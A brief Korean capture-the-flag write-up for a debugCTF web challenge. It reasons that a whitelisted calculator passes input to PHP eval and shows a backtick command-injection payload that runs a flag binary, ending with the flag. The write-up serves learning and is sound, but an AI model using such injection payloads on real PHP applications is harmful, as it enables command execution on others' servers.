### <why_are_you_there?>



![]({{ site.url }}/{{ site.baseurl }}/assets/images/writeup/debugCTF/web/index.png){: .imgcenter }

페이지를 보면 화이트 필터링이 되어있는 눈치이다. 또한 calculate 이므로 eval함수를 사용한 취약점 문제일수도 있다.

화이트 필터링되는 문자들을 사용하여 /f1a9는 쉽게 만들수있다. 하지만 eval 이라 쳐도 내부 파일을 실행시킬수있는 함수를 만들수는 없다. 하지만

```php
$cmd = `ls`; //backtick -> ``
echo $cmd; //index.php
```

백틱 문자열을 이용하여 커맨드를 사용할수있고

```php
eval("echo ".$_POST["calc"].";");
```

만약 eval 이 이런식이라 예상했을때

```
`/f1a9`
```

로 값을 준다면 플래그를 얻을수있다.

```
debugCTF{backtick_careful}
```

